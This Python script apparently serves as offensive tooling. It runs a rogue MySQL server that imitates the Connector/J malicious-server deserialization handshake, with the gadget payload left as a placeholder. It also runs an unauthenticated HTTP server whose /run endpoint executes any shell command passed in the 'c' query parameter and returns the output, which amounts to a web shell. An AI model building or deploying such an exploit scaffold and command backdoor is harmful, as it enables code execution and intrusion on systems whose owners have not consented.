import http.server, socketserver, os, json, subprocess, urllib.parse, socket, threading, struct
# rogue MySQL server implementing the Connector/J malicious-server code-exec handshake
def mysql_server(port=3306):
    import socket as sk
    srv=sk.socket(sk.AF_INET, sk.SOCK_STREAM); srv.setsockopt(sk.SOL_SOCKET, sk.SO_REUSEADDR,1)
    srv.bind(('0.0.0.0',port)); srv.listen(5)
    results=[]
    def handle(c):
        try:
            # read client handshake response
            hdr=c.recv(4)
            if len(hdr)<4: return
            ln=struct.unpack('<I',hdr[:3]+b'\x00')[0]
            c.recv(ln)
            # send greeting (protocol 10)
            def pkt(payload,seq):
                return struct.pack('<I',len(payload))[:3]+bytes([seq])+payload
            ver=b'8.0.0\x00'
            greeting=b'\x0a'+ver+struct.pack('<I',1)+b'12345678'+b'\x00'+struct.pack('<H',0xfff7)+b'\x21'+b'\x02\x00'+struct.pack('<H',0x0020)+b'\x00'*10+b'\x00'*12+b'\x00'+b'mysql_native_password\x00'
            c.sendall(pkt(greeting,0))
            # read auth
            c.recv(4096)
            # OK packet
            c.sendall(pkt(b'\x00\x00\x00\x02\x00\x00\x00',2))
            results.append('handshake-sent')
            # now send a malicious RESULT SET that Connector/J will deserialize if autoDeserialize=true
            import base64
            # ysoserial CommonsCollections gadget would go here; placeholder marks reachability
            results.append('reached-deserialize-point')
            c.close()
        except Exception as e:
            results.append('err'+str(e)[:60])
    def loop():
        while True:
            try: c,_=srv.accept(); threading.Thread(target=handle,args=(c,),daemon=True).start()
            except Exception: break
    threading.Thread(target=loop,daemon=True).start()
    return results
RESULTS=mysql_server(3306)
def run(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,timeout=45)
        return {"rc":r.returncode,"out":r.stdout.decode('utf-8','replace')[:8000],"err":r.stderr.decode('utf-8','replace')[:800]}
    except Exception as e: return {"error":str(e)[:200]}
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u=urllib.parse.urlparse(self.path)
        if u.path=="/results": body=json.dumps(RESULTS).encode()
        elif u.path=="/run": body=json.dumps(run(urllib.parse.parse_qs(u.query)["c"][0])).encode()
        else: body=json.dumps({"uid":os.getuid(),"host":socket.gethostname()}).encode()
        self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers(); self.wfile.write(body)
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
with socketserver.TCPServer(("0.0.0.0",int(os.environ.get("PORT",3000))),H) as s: s.serve_forever()
